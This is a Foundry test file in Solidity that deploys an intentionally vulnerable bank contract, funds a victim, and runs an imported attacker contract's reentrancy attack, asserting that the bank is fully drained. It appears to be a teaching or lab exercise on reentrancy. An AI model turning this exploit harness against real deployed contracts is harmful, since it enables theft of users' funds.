pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "src/SimpleBankVulnerable.sol";
import "src/Attacker.sol";

contract ExploitBankTest is Test {

    SimpleBankVulnerable public bank;
    Attacker public attacker;

    // Const
    uint256 constant INITIAL_VICTIM_DEPOSIT = 10 ether;
    uint256 constant ATTACKER_INITIAL_DEPOSIT = 1 ether;

    // Address of the victim
    address internal constant VICTIM = address(0xBEEF); 


    function setUp() public {
        // 1. Implant the SimpleBankVulnerable contract
        bank = new SimpleBankVulnerable();
        
        // 2. Fund the victim and have them deposit into the bank
        vm.deal(VICTIM, INITIAL_VICTIM_DEPOSIT); // Give victim some ETH
        vm.prank(VICTIM);
        bank.deposit{value: INITIAL_VICTIM_DEPOSIT}();
        
        // 3. Implant the Attacker contract
        // The attacker needs to be funded to deposit into the bank
        attacker = new Attacker{value: ATTACKER_INITIAL_DEPOSIT}(address(bank)); 
        
        // 4. Attacker deposits into the bank to set up for the attack
        vm.prank(address(attacker));
        attacker.deposit{value: ATTACKER_INITIAL_DEPOSIT}();
    }

    function testExploitReentrancy() public {
        // Expected initial bank balance
        uint256 initialBankBalance = address(bank).balance;
        
        // Verify initial conditions
        assertEq(initialBankBalance, INITIAL_VICTIM_DEPOSIT + ATTACKER_INITIAL_DEPOSIT, "Initial amount incorrect.");

        // 5. BEGIN THE ATTACK!!!!
        console.log("---BEGIN OF CHAOS---");
        vm.startPrank(address(attacker));
        attacker.attack(); // Start the reentrancy attack
        vm.stopPrank();
        console.log("---End---");

        // 6. Verify the results of the attack
        
        // Drain the maximum funds possible to the attacker contract
        uint256 finalAttackerContractBalance = attacker.getBalance();
        uint256 expectedRemainingBankBalance = 0; 
        
        // Assert: Check that the attacker drained significant funds
        assertGt(finalAttackerContractBalance, ATTACKER_INITIAL_DEPOSIT * 10, "Attack failed.");

        // Assert: Bank should be empty.
        assertEq(address(bank).balance, expectedRemainingBankBalance, "Bank isnt empty.");
        
        // Log 'forge test -vvv'
        console.log("Begin:", ATTACKER_INITIAL_DEPOSIT);
        console.log("End:", finalAttackerContractBalance);
        console.log("Bank:", address(bank).balance);
    }
}
